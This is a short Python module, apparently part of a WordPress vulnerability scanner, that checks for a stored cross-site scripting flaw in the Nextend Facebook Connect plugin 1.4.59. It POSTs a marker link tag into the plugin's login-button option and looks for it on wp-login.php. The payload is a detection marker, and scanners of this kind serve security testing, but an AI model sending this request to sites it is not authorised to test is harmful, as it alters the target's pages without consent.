from ..exploitxss import ExploitXSS


class NextendFacebookConnectXSS(ExploitXSS):

	EXPLOIT_NAME = 'Nextend Facebook Connect'
	EXPLOIT_VERSION = '1.4.59'
	EXPLOIT_URL = 'http://www.exploit-db.com/exploits/35439/'

	def exploit(self):
		name = self.EXPLOIT_NAME
		version = self.EXPLOIT_VERSION
		exploit = 'newfb_update_options=Y&fb_login_button=<link href="vulnpress"/>'
		hostname = self.hostname

		ExploitXSS.request(hostname, data=exploit, method='POST')

		response = ExploitXSS.request(hostname + '/wp-login.php')

		if response is not None and "vulnpress" in response:
			ExploitXSS.exploitfound(name, version, self.EXPLOIT_URL)
		else:
			ExploitXSS.exploitnotfound(name, version)
